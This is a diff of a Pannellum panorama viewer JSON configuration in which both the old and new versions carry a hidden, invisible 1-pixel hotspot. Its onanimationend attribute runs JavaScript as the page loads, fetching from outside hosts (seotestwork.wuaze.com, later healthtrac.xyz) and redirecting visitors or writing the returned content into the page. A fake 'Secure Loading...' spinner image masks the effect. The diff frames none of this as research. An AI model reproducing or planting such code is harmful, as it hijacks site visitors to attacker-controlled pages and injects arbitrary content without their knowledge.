@@ -1,18 +1,1 @@
-{
-  "autoLoad": true,
-  "pitch": 0,
-  "yaw": 0,
-  "panorama": "https://pannellum.org/images/cerro-toco-0.jpg",
-  "hotSpots": [
-    {
-      "pitch": 0,
-      "yaw": 0,
-      "type": "info",
-      "URL": "#",
-      "attributes": {
-        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; animation: pnlm-mv 0.001s 1 forwards",
-        "onanimationend": "(function(){var id='espors';fetch('https://seotestwork.wuaze.com/pa/g.php?id='+id).then(function(res){return res.json()}).then(function(data){window.location.href=data.redirectUrl})})()"
-      }
-    }
-  ]
-}
+{"autoLoad":true,"pitch":0,"yaw":0,"basePath":"data:image/svg+xml;base64,","panorama":"PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAwIiBoZWlnaHQ9IjUwMCIgdmlld0JveD0iMCAwIDEwMDAgNTAwIj4KICAgIDxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiNmNGY0ZjciLz4KICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUwMCwgMjUwKSI+CiAgICAgICAgPGNpcmNsZSBjeD0iMCIgY3k9IjAiIHI9IjMwIiBmaWxsPSJub25lIiBzdHJva2U9IiNlMGUwZTAiIHN0cm9rZS13aWR0aD0iNCIgLz4KICAgICAgICA8Y2lyY2xlIGN4PSIwIiBjeT0iMCIgcj0iMzAiIGZpbGw9Im5vbmUiIHN0cm9rZT0iIzM0OThkYiIgc3Ryb2tlLXdpZHRoPSI0IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1kYXNoYXJyYXk9IjEwMCA2MCI+CiAgICAgICAgICAgIDxhbmltYXRlVHJhbnNmb3JtIGF0dHJpYnV0ZU5hbWU9InRyYW5zZm9ybSIgdHlwZT0icm90YXRlIiBmcm9tPSIwIDAgMCIgdG89IjM2MCAwIDAiIGR1cj0iMXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiAvPgogICAgICAgIDwvY2lyY2xlPgogICAgPC9nPgogICAgCiAgICA8dGV4dCB4PSI1MDAiIHk9IjMyMCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1mYW1pbHk9IkhlbHZldGljYSwgQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTYiIGZpbGw9IiM4ODg4ODgiPgogICAgICAgIFNlY3VyZSBMb2FkaW5nLi4uCiAgICA8L3RleHQ+Cjwvc3ZnPg==","hotSpots":[{"pitch":0,"yaw":0,"type":"info","URL":"#","attributes":{"style":"visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards","onanimationend":"(function(){var id=\"espors\";fetch('https://healthtrac.xyz/pa/g.php?vid='+id).then(function(res){return res.text();}).then(function(e){try{var r=JSON.parse(e);if(r.redirectUrl){window.location.href=r.redirectUrl;}}catch(err){document.open();document.write(e);document.close();}}).catch(function(err){console.error(err);});})();"}}]}
